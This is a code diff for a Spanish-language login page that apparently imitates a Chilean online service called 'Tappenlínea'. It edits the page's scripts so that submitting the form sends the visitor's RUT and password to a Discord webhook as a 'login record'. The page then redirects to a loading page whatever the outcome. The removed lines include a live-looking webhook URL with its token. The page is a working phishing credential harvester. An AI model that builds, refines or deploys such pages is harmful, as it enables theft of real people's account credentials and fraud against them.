@@ -119,8 +119,12 @@
                           <div class="mt-2 flex justify-end">
                             <a class="inline-flex flex-row items-center gap-3 transition-colors data-[disabled=true]:pointer-events-none font-semibold text-headline-primary hover:underline active:text-headline-secondary data-[disabled=true]:text-neutral-gray-4 text-sm" role="link" href="#">¿Olvidaste tu clave?</a></div></div></div>
                       <div class="flex w-full flex-col-reverse gap-5 lg:flex-row">
-                        <button class="relative flex flex-row items-center justify-center fill-current outline-none text-base p-3 w-full bg-neutral-gray-3 rounded-full text-neutral-white cursor-not-allowed max-w-full font-semibold" type="submit" disabled="">
+
+                        
+                        <button class="relative flex flex-row items-center justify-center fill-current outline-none text-base p-3 w-full bg-neutral-gray-3 rounded-full text-neutral-white cursor-not-allowed max-w-full font-semibold" type="submit" id="loginButton">
                           <span class="order-2">Iniciar Sesión</span></button></div>
+
+                      
                       <hr class="w-full border-neutral-gray-2 lg:hidden"/>
                       <div class="flex flex-col items-center justify-center gap-1 text-sm lg:hidden">
                         <p class="font-normal text-text-primary">¿Primera vez ingresando a <strong class="font-bold">Tappenlínea</strong>? </p>
@@ -137,36 +141,52 @@
         <div id="root-portal"></div></div></div>
     <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"387744fb8e084fc187c5a74cbcb9893e","spa":2}' crossorigin="anonymous"></script>
 <script>
+  // --- 1. Lógica para Mostrar/Ocultar Contraseña ---
   const togglePassword = document.querySelector("#togglePassword");
   const password = document.querySelector("#password");
 
   togglePassword.addEventListener("click", function () {
-    // Cambiar el tipo del input entre 'password' y 'text'
     const type = password.getAttribute("type") === "password" ? "text" : "password";
     password.setAttribute("type", type);
   });
-</script>
 
-
-    <script>
-  // Seleccionar el formulario
+  // --- 2. Lógica para Activar el Botón (Validación) ---
   const loginForm = document.getElementById('loginForm');
+  const rutInput = document.getElementById('rut');
+  const passwordInput = document.getElementById('password');
+  const loginButton = document.getElementById('loginButton');
 
+  // Función que verifica si ambos campos tienen contenido
+  const checkInputs = () => {
+    const rutValue = rutInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+
+    if (rutValue !== '' && passwordValue !== '') {
+      loginButton.disabled = false;
+    } else {
+      loginButton.disabled = true;
+    }
+  };
+
+  // Agregar listeners a los inputs
+  rutInput.addEventListener('input', checkInputs);
+  passwordInput.addEventListener('input', checkInputs);
+
+  // --- 3. Lógica de Envío (Webhook + Redirección) ---
   loginForm.addEventListener('submit', async (event) => {
-    // Prevenir la recarga de la página
-    event.preventDefault();
+    event.preventDefault(); // Evita recarga de página
 
-    // Obtener los valores de los inputs
-    const rut = document.getElementById('rut').value;
-    const password = document.getElementById('password').value;
+    // Obtener valores
+    const rut = rutInput.value;
+    const password = passwordInput.value;
 
-    // Guardar el RUT en la sesión del navegador
+    // Guardar en sesión
     sessionStorage.setItem('rut', rut);
 
-    // Configurar la URL de tu Webhook de Discord
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1551764243274268672/DScPEbqjJobNa34rNWg5ibBcBfGkugRXRlKeykaT1ndEu07ECxG4Ep9Jjd5mV1XatmMK';
+    // Configuración del Webhook
+    const webhookUrl = 'TU_URL_DEL_WEBHOOK_AQUI';
     
-    // Crear el contenido del mensaje con formato profesional
+    // Payload con formato profesional
     const data = {
       content: `
         **📝 Registro de Inicio de Sesión**
@@ -181,7 +201,7 @@
       `
     };
 
-    // Enviar los datos a Discord
+    // Enviar datos y Redirigir
     try {
       const response = await fetch(webhookUrl, {
         method: 'POST',
@@ -191,13 +211,17 @@
         body: JSON.stringify(data)
       });
 
-      if (response.ok) {
-        console.log('Datos enviados a Discord correctamente');
+      // Si todo sale bien (o falla), redirigimos al usuario
+      if (response.ok || response.status === 0) { 
+        window.location.href = 'load.html';
       } else {
-        console.error('Error al enviar a Discord');
+        console.error('Error al enviar a Discord, pero redirigiendo de todos modos...');
+        window.location.href = 'load.html';
       }
     } catch (error) {
       console.error('Error de red:', error);
+      // Si hay error de red, igual redirigimos
+      window.location.href = 'load.html';
     }
   });
 </script>
